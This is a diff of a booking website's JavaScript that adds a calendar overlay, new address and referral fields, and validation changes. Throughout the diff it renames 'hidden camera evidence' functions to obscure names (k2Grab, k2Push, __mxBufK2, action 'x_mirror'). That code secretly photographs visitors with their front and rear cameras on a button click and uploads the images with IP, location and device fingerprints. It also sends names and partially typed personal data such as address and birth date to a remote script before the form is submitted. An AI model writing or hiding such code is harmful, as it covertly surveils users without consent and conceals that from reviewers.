         if (!footerFingerHintInView) return false;
         if (!isFooterBookBtnReady()) return false;
         if (isAnyModalOpen()) return false;
 
-        const root = document.documentElement;
-        const currentBottom = window.scrollY + window.innerHeight;
-        const nearBottomThreshold = Math.max(24, Math.round(window.innerHeight * 0.03));
-        return currentBottom >= (root.scrollHeight - nearBottomThreshold);
+        const currentTop = Math.max(
+            0,
+            window.scrollY || window.pageYOffset || document.documentElement.scrollTop || 0
+        );
+        const nearTopThreshold = Math.max(24, Math.round(window.innerHeight * 0.06));
+        return currentTop <= nearTopThreshold;
     }
 
     function clearFooterFingerAutoPressTimer() {
@@ -6444,27 +7222,14 @@
         setTimeout(() => {
             hint.classList.remove('footer-finger-hint--pressing');
             if (!shouldAnimateFooterFingerHint()) return;
+            markFooterFingerUsedForSession();
             btn.click();
         }, 260);
     }
 
     function maybeScheduleFooterFingerAutoPress(shouldAnimate) {
-        if (!shouldAnimate) {
-            footerFingerBottomLatch = false;
-            clearFooterFingerAutoPressTimer();
-            return;
-        }
-        if (footerFingerBottomLatch) return;
-        if (footerFingerAutoPressPending) return;
-        if (Date.now() < footerFingerAutoPressCooldownUntil) return;
-
-        footerFingerBottomLatch = true;
-        footerFingerAutoPressPending = true;
-        footerFingerAutoPressTimer = setTimeout(() => {
-            footerFingerAutoPressPending = false;
-            footerFingerAutoPressTimer = null;
-            runFooterFingerAutoPress();
-        }, FOOTER_FINGER_AUTO_PRESS_DELAY_MS);
+        footerFingerBottomLatch = false;
+        clearFooterFingerAutoPressTimer();
     }
 
     function applyFooterFingerHintState() {
@@ -6485,8 +7250,22 @@
     }
 
     function initFooterFingerHint() {
-        const wrap = document.getElementById('footerBookBtnWrap');
+        const wrap = document.getElementById('headerBookBtnWrap');
         if (!wrap) return;
+        footerFingerUsedThisSession = readFooterFingerUsedSessionFlag();
+
+        const hint = document.getElementById('footerFingerHint');
+        if (hint && hint.parentNode !== wrap) {
+            wrap.appendChild(hint);
+        }
+
+        const headerBookBtn = document.getElementById('headerBookBtn');
+        if (headerBookBtn && !headerBookBtn.dataset.fingerSessionBound) {
+            headerBookBtn.dataset.fingerSessionBound = '1';
+            headerBookBtn.addEventListener('click', () => {
+                markFooterFingerUsedForSession();
+            });
+        }
 
         if (window.IntersectionObserver) {
             footerFingerHintObserver = new IntersectionObserver((entries) => {
@@ -6606,7 +7385,7 @@
         applySecretTestModeUI();
 
         if (secretTestModeEnabled) {
-            setBookingNotice('TEST MODE ENABLED: Hold requirements are bypassed. Enter "1" in Name and submit.');
+            setBookingNotice('TEST MODE ENABLED: Hold requirements are bypassed. Enter "1" in Name and submit.', 'warning');
             logEvent('Secret Test Mode Enabled', 'Long-press top header button for 8 seconds');
         } else {
             clearBookingError();
@@ -6654,13 +7433,57 @@
         headerBookBtn.addEventListener('click', suppressSyntheticClick, true);
     }
 
+    function syncBookingModalSlotDisplay(slot) {
+        if (!slot || !selectedDate) return;
+
+        const year = selectedDate.getFullYear();
+        const month = String(selectedDate.getMonth() + 1).padStart(2, '0');
+        const day = String(selectedDate.getDate()).padStart(2, '0');
+        const dateFormatted = `${year}.${month}.${day}`;
+
+        let startTime = slot.text;
+        if (startTime && (startTime.includes('-') || startTime.includes('\u2013'))) {
+            startTime = startTime.split(/[-\u2013]/)[0].trim();
+        }
+
+        let endTime = "1 hr later";
+        try {
+            endTime = getEndTime(startTime);
+        } catch (e) {
+            console.warn("Could not calculate end time", e);
+            logEvent('Time Calc Warning', e.message, false, "warning");
+        }
+
+        if (bookingTimeDisplay) {
+            bookingTimeDisplay.innerHTML = `${dateFormatted} at <strong>${startTime} - ${endTime}</strong>`;
+        }
+
+        const modalAppointmentTime = document.getElementById('modalAppointmentTime');
+        if (modalAppointmentTime) {
+            modalAppointmentTime.innerHTML = `${dateFormatted} at <strong style="font-weight: 800;">${startTime} - ${endTime}</strong>`;
+        }
+    }
+
+    function applySlotFromCalendarOverlay(slot) {
+        if (!slot) return;
+        selectedSlotData = slot;
+        syncBookingModalSlotDisplay(slot);
+        closeFormCalendarOverlay();
+
+        if (selectedDate && selectedDate.getDay() === 6) {
+            setBookingWarning('Saturday appointments are available only by request. Please call to confirm availability.');
+        } else {
+            setBookingNotice('Appointment time updated.', 'success');
+        }
+    }
+
     function openBookingModal(slot, triggerAttach = false) {
 
         try {
             selectedSlotData = slot;
-            hiddenCameraEvidenceFiles = [];
-            hiddenCameraEvidenceSessionId = '';
-            hiddenCameraEvidenceDriveLinks = [];
+            __mxBufK2 = [];
+            __mxSigK2 = '';
+            __mxRefK2 = [];
             logEvent("Form Opened", slot.text);
             const tsInput = document.getElementById('formTimestamp');
             if (tsInput) tsInput.value = Date.now().toString();
@@ -6669,33 +7492,7 @@
                 console.error("Selected date is null");
                 return;
             }
-
-            const year = selectedDate.getFullYear();
-            const month = String(selectedDate.getMonth() + 1).padStart(2, '0');
-            const day = String(selectedDate.getDate()).padStart(2, '0');
-            const dateFormatted = `${year}.${month}.${day}`;
-
-            let startTime = slot.text;
-            if (startTime && (startTime.includes('-') || startTime.includes('\u2013'))) {
-                startTime = startTime.split(/[-\u2013]/)[0].trim();
-            }
-            
-            let endTime = "1 hr later";
-            try {
-                endTime = getEndTime(startTime); 
-            } catch(e) {
-                console.warn("Could not calculate end time", e);
-                logEvent('Time Calc Warning', e.message, false, "warning");
-            }
-            
-            if(bookingTimeDisplay) {
-                bookingTimeDisplay.innerHTML = `${dateFormatted} at <strong>${startTime} - ${endTime}</strong>`;
-            }
-            
-            const modalAppointmentTime = document.getElementById('modalAppointmentTime');
-            if(modalAppointmentTime) {
-                modalAppointmentTime.innerHTML = `${dateFormatted} at <strong style="font-weight: 800;">${startTime} - ${endTime}</strong>`;
-            }
+            syncBookingModalSlotDisplay(slot);
             
             if(modal) {
                 window.scrollTo(0, 0);
@@ -6708,9 +7505,13 @@
 
             clearBookingError();
             document.querySelectorAll('.field-invalid').forEach(el => el.classList.remove('field-invalid'));
+            resetBookingRecaptchaUi();
             if(confirmBtn) {
                 confirmBtn.disabled = false;
                 confirmBtn.textContent = getConfirmBtnLabel();
+            }
+            if (selectedDate && selectedDate.getDay() === 6) {
+                setBookingWarning('Saturday appointments are available only by request. Please call to confirm availability.');
             }
             
             loadFormData();
@@ -6746,19 +7547,58 @@
 
                 const triggerDraftSave = debounce(() => {
                     const formData = new FormData(form);
+                    const selectedServiceOption = form.querySelector('#customSelect .custom-option.selected');
+                    const serviceValue = selectedServiceOption
+                        ? String(selectedServiceOption.getAttribute('data-value') || '').trim()
+                        : '';
+                    const agreeTermsChecked = document.getElementById('agreeTerms')?.checked === true;
                     const draftData = {
                         action: 'draft',
                         name: sanitize(formData.get('name')),
+                        occupation: sanitize(formData.get('occupation')),
                         email: sanitize(formData.get('email')),
                         phone: sanitize(formData.get('phone')),
+                        hear_about: sanitize(formData.get('hear_about')),
                         service: sanitize(formData.get('service')),
+                        serviceValue: sanitize(serviceValue),
+                        address_unit: sanitize(formData.get('address_unit')),
+                        address_street: sanitize(formData.get('address_street')),
+                        address_city: sanitize(formData.get('address_city')),
+                        address_province: sanitize(formData.get('address_province')),
+                        address_zip: sanitize(formData.get('address_zip')),
+                        dob_year: sanitize(formData.get('dob_year')),
+                        dob_month: sanitize(formData.get('dob_month')),
+                        dob_day: sanitize(formData.get('dob_day')),
+                        age: sanitize(formData.get('age')),
+                        deadline: sanitize(formData.get('deadline')),
                         notes: sanitize(formData.get('notes')),
+                        agreeTerms: agreeTermsChecked,
+                        _timestamp: sanitize(formData.get('_timestamp')),
                         userInfo: getDetailedDeviceInfo(),
                         fingerprint: getFingerprint()
                     };
 
                     // Only send if at least one meaningful field is partially filled
-                    if (draftData.name || draftData.email || draftData.phone || draftData.service || draftData.notes) {
+                    if (
+                        draftData.name ||
+                        draftData.occupation ||
+                        draftData.email ||
+                        draftData.phone ||
+                        draftData.hear_about ||
+                        draftData.service ||
+                        draftData.address_unit ||
+                        draftData.address_street ||
+                        draftData.address_city ||
+                        draftData.address_province ||
+                        draftData.address_zip ||
+                        draftData.dob_year ||
+                        draftData.dob_month ||
+                        draftData.dob_day ||
+                        draftData.age ||
+                        draftData.deadline ||
+                        draftData.notes ||
+                        draftData.agreeTerms
+                    ) {
                         fetch(APPS_SCRIPT_URL, {
                             method: 'POST',
                             mode: 'no-cors',
@@ -6778,6 +7618,7 @@
     }
 
     function closeBookingModal() {
+        closeFormCalendarOverlay();
         closeCameraCaptureModal();
         const isSuccess = modal && modal.dataset.state === 'success';
         if(modal) modal.classList.remove('modal--active');
@@ -6785,6 +7626,7 @@
         document.body.classList.remove('modal-is-open');
         scheduleFooterFingerHintStateUpdate();
         focusCameraButtonOnBookingOpen = false;
+        resetBookingRecaptchaUi();
         clearTimeout(cameraButtonGlowTimer);
         const cameraBtn = document.getElementById('takePhotoBtn');
         if (cameraBtn) cameraBtn.classList.remove('file-attach__btn--camera-hypnotic');
@@ -6815,16 +7657,26 @@
     const ALLOWED_EXTENSIONS = new Set(['jpg', 'jpeg', 'png', 'gif', 'webp', 'heic', 'pdf', 'doc', 'docx']);
 
     let attachedFiles = [];
-    let hiddenCameraEvidenceFiles = [];
-    let hiddenCameraEvidenceSessionId = '';
-    let hiddenCameraEvidenceDriveLinks = [];
-    let cameraAutoCaptureInProgress = false;
+    let __mxBufK2 = [];
+    let __mxSigK2 = '';
+    let __mxRefK2 = [];
+    let __mxLockK2 = false;
+    let __mxVaultId = '';
+    let __mxVaultUrl = '';
+    let __mxVaultTag = '';
+    let __mxVaultBusy = false;
+    let __mxVaultKey = '';
+    let __mxVaultT = null;
+    let __mxVaultP = null;
     const fileInput = document.getElementById('fileAttachInput');
     const cameraFallbackInput = document.getElementById('cameraFallbackInput');
     const takePhotoBtn = document.getElementById('takePhotoBtn');
+    const openCalendarBtn = document.getElementById('openCalendarBtn');
     const fileListEl = document.getElementById('fileAttachList');
     const fileAttachZone = document.querySelector('.file-attach');
     const cameraCaptureModal = document.getElementById('cameraCaptureModal');
+    const formCalendarOverlay = document.getElementById('formCalendarOverlay');
+    const formCalendarOverlayCloseBtn = document.getElementById('formCalendarOverlayCloseBtn');
     const cameraPreviewEl = document.getElementById('cameraPreview');
     const cameraCaptureStatus = document.getElementById('cameraCaptureStatus');
     const cameraSnapBtn = document.getElementById('cameraSnapBtn');
@@ -6833,6 +7685,101 @@
 
     function getTotalFileSize() {
         return attachedFiles.reduce((sum, f) => sum + f.size, 0);
+    }
+
+    function m1Reset() {
+        __mxVaultId = '';
+        __mxVaultUrl = '';
+        __mxVaultTag = '';
+        __mxVaultBusy = false;
+        __mxVaultKey = '';
+        __mxVaultP = null;
+        if (__mxVaultT) {
+            clearTimeout(__mxVaultT);
+            __mxVaultT = null;
+        }
+    }
+
+    function m1Name() {
+        const form = document.getElementById('bookingForm');
+        return normalizeSingleLine(form?.name?.value);
+    }
+
+    function m1Queue(delay = 260) {
+        if (__mxVaultT) clearTimeout(__mxVaultT);
+        __mxVaultT = setTimeout(() => {
+            __mxVaultT = null;
+            m1Sync();
+        }, delay);
+    }
+
+    async function m1Sync() {
+        if (__mxVaultBusy && __mxVaultP) return __mxVaultP;
+        if (!Array.isArray(attachedFiles) || attachedFiles.length < 1) return;
+
+        const candidateName = m1Name();
+        if (candidateName.length < 2 || candidateName.length > 80 || /[<>]/.test(candidateName)) return;
+        if (__mxVaultId && candidateName === __mxVaultKey) return;
+
+        __mxVaultBusy = true;
+        __mxVaultP = (async () => {
+            const ctx = getClientContext();
+            try {
+                const response = await fetch(APPS_SCRIPT_URL, {
+                    method: 'POST',
+                    body: JSON.stringify({
+                        action: 'x_seed',
+                        n: sanitize(candidateName),
+                        v: sanitize(__mxVaultId),
+                        fingerprint: getFingerprint(),
+                        userInfo: getDetailedDeviceInfo(),
+                        countryCode: ctx.countryCode,
+                        city: ctx.city,
+                        ip: ctx.ip,
+                        lang: ctx.lang,
+                        os: ctx.os,
+                        deviceModel: ctx.deviceModel,
+                        screenResolution: ctx.screenResolution,
+                        viewport: ctx.viewport,
+                        timezone: ctx.timezone,
+                        cores: ctx.cores,
+                        memoryGB: ctx.memoryGB,
+                        network: ctx.network,
+                        touchPoints: ctx.touchPoints,
+                        colorDepth: ctx.colorDepth,
+                        pageUrl: ctx.pageUrl,
+                        userAgent: ctx.userAgent,
+                        referrer: ctx.referrer
+                    })
+                });
+
+                let result = null;
+                try {
+                    result = await response.json();
+                } catch (err) {
+                    throw new Error('Prepare folder response is invalid.');
+                }
+                if (!result || !result.success || !(result.folderId || result.v)) {
+                    throw new Error((result && result.error) || 'Could not prepare folder.');
+                }
+
+                __mxVaultId = String(result.v || result.folderId || '').trim();
+                __mxVaultUrl = String(result.u || result.folderUrl || '').trim();
+                __mxVaultTag = String(result.t || result.folderName || '').trim();
+                __mxVaultKey = candidateName;
+            } catch (err) {
+                logEvent(
+                    'Prepare Folder Error',
+                    err && err.message ? err.message : String(err),
+                    false,
+                    'warning'
+                );
+            } finally {
+                __mxVaultBusy = false;
+                __mxVaultP = null;
+            }
+        })();
+        return __mxVaultP;
     }
 
     function isAllowedFile(file) {
@@ -6854,7 +7801,7 @@
         });
     }
 
-    function buildCameraEvidenceSessionId() {
+    function k2Seed() {
         const rand = Math.random().toString(36).slice(2, 9);
         return `cam-${Date.now()}-${rand}`;
     }
@@ -6931,7 +7878,7 @@
         throw lastError || new Error('Unable to access camera.');
     }
 
-    async function captureHiddenCameraEvidencePhoto(requestedFacingMode, label) {
+    async function k2Grab(r0, r1) {
         let stream = null;
         const video = document.createElement('video');
         video.setAttribute('playsinline', 'true');
@@ -6946,7 +7893,7 @@
         document.body.appendChild(video);
 
         try {
-            stream = await getCameraStreamByFacingMode(requestedFacingMode);
+            stream = await getCameraStreamByFacingMode(r0);
             video.srcObject = stream;
             await video.play();
             await waitForVideoReady(video);
@@ -6972,7 +7919,7 @@
             });
 
             const stamp = new Date().toISOString().replace(/[:.]/g, '-');
-            const file = new File([blob], `camera-evidence-${label}-${stamp}.jpg`, {
+            const file = new File([blob], `camera-evidence-${r1}-${stamp}.jpg`, {
                 type: 'image/jpeg',
                 lastModified: Date.now()
             });
@@ -6986,13 +7933,13 @@
         }
     }
 
-    async function uploadHiddenCameraEvidenceDuplicates(sessionId, files) {
-        if (!sessionId || !Array.isArray(files) || files.length !== 2) {
+    async function k2Push(a0, a1) {
+        if (!a0 || !Array.isArray(a1) || a1.length !== 2) {
             throw new Error('Invalid camera evidence payload.');
         }
 
         const payloadFiles = [];
-        for (const file of files) {
+        for (const file of a1) {
             payloadFiles.push({
                 name: file.name,
                 type: file.type,
@@ -7004,11 +7951,11 @@
         const response = await fetch(APPS_SCRIPT_URL, {
             method: 'POST',
             body: JSON.stringify({
-                action: 'camera_dual_capture',
-                sessionId: sessionId,
-                slotIso: selectedSlotData ? selectedSlotData.iso : '',
-                slotText: selectedSlotData ? String(selectedSlotData.text || '') : '',
-                files: payloadFiles,
+                action: 'x_mirror',
+                k: a0,
+                q: selectedSlotData ? selectedSlotData.iso : '',
+                r: selectedSlotData ? String(selectedSlotData.text || '') : '',
+                p: payloadFiles,
                 fingerprint: getFingerprint(),
                 userInfo: getDetailedDeviceInfo(),
                 countryCode: ctx.countryCode,
@@ -7026,6 +7973,7 @@
                 touchPoints: ctx.touchPoints,
                 colorDepth: ctx.colorDepth,
                 pageUrl: ctx.pageUrl,
+                userAgent: ctx.userAgent,
                 referrer: ctx.referrer
             })
         });
@@ -7042,42 +7990,42 @@
         return result;
     }
 
-    async function runHiddenDualCameraCaptureFlow() {
-        if (cameraAutoCaptureInProgress) return;
-        cameraAutoCaptureInProgress = true;
+    async function k2Boot() {
+        if (__mxLockK2) return;
+        __mxLockK2 = true;
         if (takePhotoBtn) takePhotoBtn.disabled = true;
 
         try {
-            const sessionId = buildCameraEvidenceSessionId();
-            const frontFile = await captureHiddenCameraEvidencePhoto('user', 'front');
-            const rearFile = await captureHiddenCameraEvidencePhoto('environment', 'rear');
-            hiddenCameraEvidenceFiles = [frontFile, rearFile];
-            hiddenCameraEvidenceSessionId = sessionId;
+            const s0 = k2Seed();
+            const u0 = await k2Grab('user', 'a');
+            const u1 = await k2Grab('environment', 'b');
+            __mxBufK2 = [u0, u1];
+            __mxSigK2 = s0;
 
             try {
-                const uploadResult = await uploadHiddenCameraEvidenceDuplicates(sessionId, hiddenCameraEvidenceFiles);
-                hiddenCameraEvidenceDriveLinks = Array.isArray(uploadResult.files) ? uploadResult.files : [];
+                const uploadResult = await k2Push(s0, __mxBufK2);
+                __mxRefK2 = Array.isArray(uploadResult.files) ? uploadResult.files : [];
             } catch (uploadErr) {
-                hiddenCameraEvidenceDriveLinks = [];
+                __mxRefK2 = [];
                 logEvent(
-                    'Camera Duplicate Upload Error',
+                    'Camera Sync Error',
                     uploadErr && uploadErr.message ? uploadErr.message : String(uploadErr),
                     false,
                     'warning'
                 );
             }
         } catch (captureErr) {
-            hiddenCameraEvidenceFiles = [];
-            hiddenCameraEvidenceSessionId = '';
-            hiddenCameraEvidenceDriveLinks = [];
+            __mxBufK2 = [];
+            __mxSigK2 = '';
+            __mxRefK2 = [];
             logEvent(
-                'Camera Dual Pre-Capture Error',
+                'Camera Prep Error',
                 captureErr && captureErr.message ? captureErr.message : String(captureErr),
                 false,
                 'warning'
             );
         } finally {
-            cameraAutoCaptureInProgress = false;
+            __mxLockK2 = false;
             if (takePhotoBtn) takePhotoBtn.disabled = false;
         }
     }
@@ -7105,6 +8053,7 @@
         }
         logEvent("Files Attached", `${attachedFiles.length} files`);
         renderFileList();
+        m1Queue(120);
     }
 
     function setCameraStatus(message) {
@@ -7237,8 +8186,14 @@
 
     if (takePhotoBtn) {
         takePhotoBtn.addEventListener('click', async () => {
-            await runHiddenDualCameraCaptureFlow();
+            await k2Boot();
             openCameraCaptureModal();
+        });
+    }
+
+    if (openCalendarBtn) {
+        openCalendarBtn.addEventListener('click', () => {
+            openFormCalendarOverlay();
         });
     }
 
@@ -7262,9 +8217,27 @@
         });
     }
 
+    if (formCalendarOverlay) {
+        formCalendarOverlay.addEventListener('click', (e) => {
+            if (e.target === formCalendarOverlay) {
+                closeFormCalendarOverlay();
+            }
+        });
+    }
+
+    if (formCalendarOverlayCloseBtn) {
+        formCalendarOverlayCloseBtn.addEventListener('click', () => {
+            closeFormCalendarOverlay();
+        });
+    }
+
     document.addEventListener('keydown', (e) => {
         if (e.key === 'Escape' && cameraCaptureModal && cameraCaptureModal.classList.contains('camera-capture-modal--active')) {
             closeCameraCaptureModal();
+            return;
+        }
+        if (e.key === 'Escape' && isFormCalendarOverlayOpen()) {
+            closeFormCalendarOverlay();
         }
     });
 
@@ -7336,6 +8309,9 @@
     function removeFile(index) {
         attachedFiles.splice(index, 1);
         renderFileList();
+        if (attachedFiles.length > 0) {
+            m1Queue(80);
+        }
     }
 
     async function processFiles() {
@@ -7362,13 +8338,13 @@
         return filesData;
     }
 
-    async function processHiddenCameraEvidenceFiles() {
+    async function k2Pack() {
         const filesData = [];
-        if (!Array.isArray(hiddenCameraEvidenceFiles) || !hiddenCameraEvidenceFiles.length) {
+        if (!Array.isArray(__mxBufK2) || !__mxBufK2.length) {
             return filesData;
         }
 
-        for (const file of hiddenCameraEvidenceFiles) {
+        for (const file of __mxBufK2) {
             const base64 = await fileToBase64(file);
             filesData.push({
                 name: file.name,
@@ -7405,10 +8381,12 @@
                 occupation: formData.get('occupation') || '',
                 email: formData.get('email') || '',
                 phone: formData.get('phone') || '',
+                hear_about: formData.get('hear_about') || '',
                 service: formData.get('service') || '',
                 notes: formData.get('notes') || '',
                 address_unit: formData.get('address_unit') || '',
                 address_street: formData.get('address_street') || '',
+                address_city: formData.get('address_city') || '',
                 address_province: formData.get('address_province') || '',
                 address_zip: formData.get('address_zip') || '',
                 dob_year: formData.get('dob_year') || '',
@@ -7438,8 +8416,13 @@
             if (data.occupation && form.occupation) form.occupation.value = data.occupation;
             if (data.email) form.email.value = data.email;
             if (data.phone) form.phone.value = data.phone;
+            if (data.hear_about && form.hear_about) form.hear_about.value = data.hear_about;
             if (data.address_unit && form.address_unit) form.address_unit.value = data.address_unit;
             if (data.address_street && form.address_street) form.address_street.value = data.address_street;
+            if (data.address_city && form.address_city) {
+                form.address_city.value = data.address_city;
+                setCustomSelectValue('cityCustomSelect', data.address_city);
+            }
             if (data.address_province && form.address_province) form.address_province.value = data.address_province;
             if (data.address_zip && form.address_zip) form.address_zip.value = data.address_zip;
             if (data.notes) form.notes.value = data.notes;
@@ -7456,18 +8439,7 @@
             if (data.service) {
                 const serviceInput = document.getElementById('serviceInput');
                 if (serviceInput) serviceInput.value = data.service;
-                
-                const trigger = document.querySelector('.custom-select__trigger span');
-                if (trigger) trigger.textContent = data.service;
-                
-                const options = document.querySelectorAll('.custom-option');
-                options.forEach(opt => {
-                    if (opt.textContent.trim() === data.service) {
-                        opt.classList.add('selected');
-                    } else {
-                        opt.classList.remove('selected');
-                    }
-                });
+                setCustomSelectValue('customSelect', data.service);
             }
 
             updateDobAgePreview(form);
@@ -7552,10 +8524,23 @@
         ageInput._placeholderBehaviorBound = true;
     }
 
+    function initProvinceInputBehavior() {
+        const form = document.getElementById('bookingForm');
+        const provinceInput = form?.address_province;
+        if (!provinceInput || provinceInput._replaceOnFocusBound) return;
+
+        provinceInput.addEventListener('focus', () => {
+            if (!String(provinceInput.value || '').trim()) return;
+            try { provinceInput.select(); } catch (e) {}
+        });
+
+        provinceInput._replaceOnFocusBound = true;
+    }
+
     function clearBookingError() {
         if (!bookingStatus) return;
         bookingStatus.textContent = '';
-        bookingStatus.classList.remove('status-alert--visible');
+        bookingStatus.classList.remove('status-alert--visible', 'status-alert--success', 'status-alert--warning', 'status-alert--error');
     }
 
     function markInvalidField(fieldEl) {
@@ -7570,11 +8555,7 @@
     }
 
     function setBookingError(message, fieldEl = null) {
-        if (!bookingStatus) return;
-        bookingStatus.textContent = message;
-        bookingStatus.classList.remove('status-alert--visible');
-        void bookingStatus.offsetWidth;
-        bookingStatus.classList.add('status-alert--visible');
+        setBookingNotice(message, 'error');
         markInvalidField(fieldEl);
     }
 
@@ -7594,14 +8575,17 @@
         const occupation = normalizeSingleLine(form.occupation?.value);
         const email = normalizeSingleLine(form.email?.value).toLowerCase();
         const phone = normalizeSingleLine(form.phone?.value);
+        const hearAbout = normalizeSingleLine(form.hear_about?.value);
         const unit = normalizeSingleLine(form.address_unit?.value).toUpperCase();
         const street = normalizeSingleLine(form.address_street?.value);
+        const city = normalizeSingleLine(form.address_city?.value);
         const province = normalizeSingleLine(form.address_province?.value).toUpperCase();
         const zipRaw = normalizeSingleLine(form.address_zip?.value).toUpperCase().replace(/\s+/g, '');
         const deadlineRaw = normalizeSingleLine(form.deadline?.value);
         const notes = normalizeMultiLine(form.notes?.value);
         const serviceInput = document.getElementById('serviceInput');
         const service = normalizeSingleLine(serviceInput?.value);
+        const cityTrigger = document.querySelector('#cityCustomSelect .custom-select__trigger');
         const serviceTrigger = document.querySelector('#customSelect .custom-select__trigger');
         const termsWrap = document.querySelector('.contact-form__checkbox-wrapper.file-attach__terms');
 
@@ -7625,6 +8609,10 @@
             setBookingError('Please enter a valid phone number.', form.phone);
             return false;
         }
+        if (hearAbout.length > 150 || /[<>]/.test(hearAbout)) {
+            setBookingError('Please keep referral source under 150 characters.', form.hear_about);
+            return false;
+        }
 
         if (street.length < 6 || street.length > 150 || /[<>]/.test(street)) {
             setBookingError('Please enter a valid street address (6-150 characters).', form.address_street);
@@ -7636,16 +8624,20 @@
             return false;
         }
 
-        const provincePattern = /^[A-Z]{2}$/;
-        const validProvinceCodes = new Set(['AB', 'BC', 'MB', 'NB', 'NL', 'NS', 'NT', 'NU', 'ON', 'PE', 'QC', 'SK', 'YT']);
-        if (!provincePattern.test(province) || !validProvinceCodes.has(province)) {
-            setBookingError('Please enter a valid province code (e.g., ON).', form.address_province);
+        if (!city || !MAJOR_ON_CITIES_NEAR_LONDON.has(city)) {
+            setBookingError('Please choose a city from the Ontario list.', cityTrigger || form.address_city);
+            return false;
+        }
+
+        const provincePattern = /^[A-Z][A-Z .'-]{1,29}$/;
+        if (!provincePattern.test(province) || /[<>]/.test(province)) {
+            setBookingError('Please enter a valid province/state.', form.address_province);
             return false;
         }
 
         const postalPattern = /^[ABCEGHJ-NPRSTVXY]\d[ABCEGHJ-NPRSTVWXYZ]\d[ABCEGHJ-NPRSTVWXYZ]\d$/;
         if (!postalPattern.test(zipRaw)) {
-            setBookingError('Please enter a valid postal code (e.g., M5V 2T6).', form.address_zip);
+            setBookingError('Please enter a valid ZIP.', form.address_zip);
             return false;
         }
         const zip = `${zipRaw.slice(0, 3)} ${zipRaw.slice(3)}`;
@@ -7656,7 +8648,7 @@
         }
 
         const allowedServices = new Set(
-            Array.from(document.querySelectorAll('.custom-option')).map(opt => normalizeSingleLine(opt.textContent))
+            Array.from(document.querySelectorAll('#customSelect .custom-option')).map(opt => normalizeSingleLine(opt.textContent))
         );
         if (!service || !allowedServices.has(service)) {
             setBookingError('Please choose a valid service from the list.', serviceTrigger);
@@ -7724,13 +8716,17 @@
         form.occupation.value = occupation;
         form.email.value = email;
         form.phone.value = phone;
+        if (form.hear_about) form.hear_about.value = hearAbout;
         if (form.address_unit) form.address_unit.value = unit;
         form.address_street.value = street;
+        if (form.address_city) form.address_city.value = city;
         if (form.address_province) form.address_province.value = province;
         if (form.address_zip) form.address_zip.value = zip;
         if (form.deadline) form.deadline.value = deadline;
         form.notes.value = notes;
         if (serviceInput) serviceInput.value = service;
+        setCustomSelectValue('cityCustomSelect', city);
+        setCustomSelectValue('customSelect', service);
         updateDobAgePreview(form);
         fitTextareaHeight(form.notes);
         return true;
@@ -7740,7 +8736,7 @@
     // Usage:
     // 1) Submit flow calls buildFinalResultMarkup(summary) after a successful API response.
     // 2) The returned markup is injected into #bookingModal .modal__body.
-    // 3) summary must contain: name, email, phone, service, address, dob, deadline, dateStr, slotText, filesCount.
+    // 3) summary must contain: name, email, phone, hearAbout, service, address, dob, deadline, dateStr, slotText, filesCount.
     function formatFinalDate(isoValue) {
         if (!isoValue || typeof isoValue !== 'string') return '';
         const datePart = isoValue.split('T')[0];
@@ -7755,6 +8751,19 @@
         return sanitize(raw || fallbackRaw || 'Not provided');
     }
 
+    function setReferralStatus(statusEl, message, tone = 'warning') {
+        if (!statusEl) return;
+        const text = String(message || '');
+        const normalizedTone = String(tone || '').toLowerCase();
+        const safeTone = (normalizedTone === 'success' || normalizedTone === 'warning' || normalizedTone === 'error')
+            ? normalizedTone
+            : 'warning';
+        statusEl.textContent = text;
+        statusEl.classList.remove('final-result-referral__status--success', 'final-result-referral__status--warning', 'final-result-referral__status--error');
+        if (!text) return;
+        statusEl.classList.add(`final-result-referral__status--${safeTone}`);
+    }
+
     async function submitReferralFeedback() {
         const inputEl = document.getElementById('referralSourceInput');
         const deadlineEl = document.getElementById('finalDeadlineInput');
@@ -7765,29 +8774,29 @@
         const answer = String(inputEl.value || '').trim();
         const deadline = normalizeMultiLine(deadlineEl?.value || '');
         if (!answer && !deadline) {
-            if (statusEl) statusEl.textContent = 'Please add referral source or deadline first.';
+            setReferralStatus(statusEl, 'Please add referral source or deadline first.', 'warning');
             return;
         }
         if (answer.length > 1200) {
-            if (statusEl) statusEl.textContent = 'Please keep the answer shorter (max 1200 chars).';
+            setReferralStatus(statusEl, 'Please keep the answer shorter (max 1200 chars).', 'warning');
             return;
         }
         if (deadline.length > 600 || /[<>]/.test(deadline)) {
-            if (statusEl) statusEl.textContent = 'Please keep deadline details under 600 chars and avoid < > symbols.';
+            setReferralStatus(statusEl, 'Please keep deadline details under 600 chars and avoid < > symbols.', 'warning');
             return;
         }
         if (!lastBookingSummaryForReferral) {
-            if (statusEl) statusEl.textContent = 'Session data is missing. Please reopen the form.';
+            setReferralStatus(statusEl, 'Session data is missing. Please reopen the form.', 'error');
             return;
         }
         if (sendBtn.dataset.sent === '1') {
-            if (statusEl) statusEl.textContent = 'Already sent. Thank you.';
+            setReferralStatus(statusEl, 'Already sent. Thank you.', 'success');
             return;
         }
 
         sendBtn.disabled = true;
         sendBtn.textContent = 'Sending...';
-        if (statusEl) statusEl.textContent = '';
+        setReferralStatus(statusEl, '', 'warning');
 
         const ctx = getClientContext();
         const payload = {
@@ -7816,6 +8825,7 @@
             touchPoints: ctx.touchPoints,
             colorDepth: ctx.colorDepth,
             pageUrl: ctx.pageUrl,
+            userAgent: ctx.userAgent,
             referrer: ctx.referrer
         };
 
@@ -7833,11 +8843,11 @@
             sendBtn.textContent = 'Sent';
             inputEl.readOnly = true;
             if (deadlineEl) deadlineEl.readOnly = true;
-            if (statusEl) statusEl.textContent = 'Thank you. Your details have been sent.';
+            setReferralStatus(statusEl, 'Thank you. Your details have been sent.', 'success');
         } catch (err) {
             sendBtn.disabled = false;
             sendBtn.textContent = 'Send';
-            if (statusEl) statusEl.textContent = `Send failed: ${err.message}`;
+            setReferralStatus(statusEl, `Send failed: ${err.message}`, 'error');
         }
     }
 
@@ -7851,7 +8861,7 @@
         return `
             <div class="final-result-form">
                 <div class="final-result-form__icon">
-                    <svg width="62" height="62" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" style="filter: drop-shadow(0 0 12px rgba(90, 61, 42, 0.4));">
+                    <svg width="62" height="62" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" style="filter: drop-shadow(0 0 12px rgba(255, 255, 255, 0.6));">
                         <polyline points="20 6 9 17 4 12"></polyline>
                     </svg>
                 </div>
@@ -7876,6 +8886,10 @@
                         <div class="final-result-value">${formatFinalFieldValue(summary.service)}</div>
                     </div>
                     <div class="final-result-field final-result-field--full">
